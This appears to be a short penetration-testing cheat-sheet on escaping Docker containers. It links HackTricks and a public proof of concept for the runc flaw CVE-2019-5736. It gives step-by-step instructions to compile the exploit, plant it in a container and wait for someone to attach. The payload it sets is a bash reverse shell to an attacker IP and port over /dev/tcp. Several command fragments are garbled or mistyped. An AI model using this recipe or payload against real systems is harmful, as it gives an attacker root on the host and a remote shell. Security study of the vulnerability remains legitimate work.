# docker

## [HackTrick Docker Breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)

```bash
exec -it <image>
https://github.com/Frichetten/CVE-2019-5736-PoC

escape as root #hacktrick
fdsisk -l
```

## Docker breakout runC exploit

```bash
Using https://github.com/Frichetten/CVE-2019-5736-PoC

Explanation (https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736)
The vulnerability allows a malicious container to overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command.
1. Update payload in the `main.go`;
2. var payload = "#!/bin/bash \n bash -i >& /dev/tcp/IP/PORT 0>&1" 
3. compile it with go build main.go.
4. Move that binary to the container you'd like to escape from.
5. Execute the binary, and then the next time someone attaches to it and calls /bin/sh your payload will fire.
```
